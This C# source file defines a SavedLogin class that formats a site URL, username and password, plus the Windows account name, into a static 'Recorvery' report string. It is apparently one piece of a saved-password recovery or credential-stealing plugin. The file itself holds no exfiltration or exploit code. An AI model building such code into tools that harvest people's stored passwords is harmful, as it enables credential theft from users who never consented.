using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Plugin
{
    class SavedLogin
    {
        public string Url;
        public string Username;
        public string Password;

        public SavedLogin(string url, string user, string pass)
        {
            Url = url;
            Username = user;
            Password = pass;
        }

        public void Print()
        {
            string user = Environment.GetEnvironmentVariable("USERNAME");
            Recorvery.login0 += ("--- Credential (User: " + user + ") ---");
            Recorvery.login0 += "\n";
            Recorvery.login0 += ("URL      : " + Url);
            Recorvery.login0 += "\n";
            Recorvery.login0 += ("Username : " + Username);
            Recorvery.login0 += "\n";
            Recorvery.login0 += ("Password : " + Password);
            Recorvery.login0 += "\n";
        }
    }
}
